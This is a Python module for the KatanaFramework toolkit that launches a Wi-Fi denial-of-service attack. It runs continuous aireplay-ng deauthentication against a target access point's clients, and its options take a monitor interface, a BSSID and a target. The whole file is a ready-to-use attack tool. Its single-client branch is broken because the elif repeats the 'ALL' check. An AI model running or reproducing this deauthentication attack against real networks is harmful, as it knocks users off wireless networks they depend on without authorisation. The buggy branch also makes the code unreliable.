# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
import commands,subprocess
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="2.1"
	init.Description        ="Wifi Denegation of service"
	init.CodeName           ="wifi/ap.dos"
	init.DateCreation       ="11/06/2015"      
	init.LastModification   ="25/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE              RQ     DESCRIPTION
		'drive'  :[INTERFACE_MONITOR,True ,'Interface'],
		'bssid'  :[MAC_TARGET       ,True ,'AP Mac Address'],
		'target' :["ALL"            ,True ,'Targes']
	}

	# AUX INFORMATION MODULE
	init.aux = "\n (target) options"
	init.aux += "\n -> [ALL] all wireless clients."
	init.aux += "\n -> [MAC] a single client access.\n"
	init.aux += "\n Devices Founds: "+str(NET.GetInterfacesOnSystem())
	init.aux += "\n Monitors Inter: """+str(NET.GetMonitorInterfaces())
	init.aux += "\n Functions     : For Scan Ap's, type 'f::getaps(Monitor_Interface,Time)"
	init.aux += "\n                  For Start Monitor Mode, type 'f::startmonitormode(Interface)\n" 
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	if NET.CheckIfExistInterface(init.var['drive']):
		if   init.var['target']  == "ALL": SYSTEM.Subprocess("aireplay-ng -0 0 -a "+init.var['bssid']+" "+init.var['drive'])
		elif init.var['target']  == "ALL": SYSTEM.Subprocess("aireplay-ng -0 0 -a "+init.var['bssid']+" -c "+init.var['target']+" "+init.var['drive'])
		else:
			init.var['target'] = "ALL"
			printk.err("Type not allow, use show options or sop and see Auxiliar help.")
			return

		printk.inf("Starting attack to "+init.var['target']+" with [aireplay-ng]")
		raw_input(printk.pkey("if you want to stop DOS Attack (PRESS [ENTER])"))
		SYSTEM.KillProcess("aireplay-ng")
		
# CODE MODULE    ############################################################################################
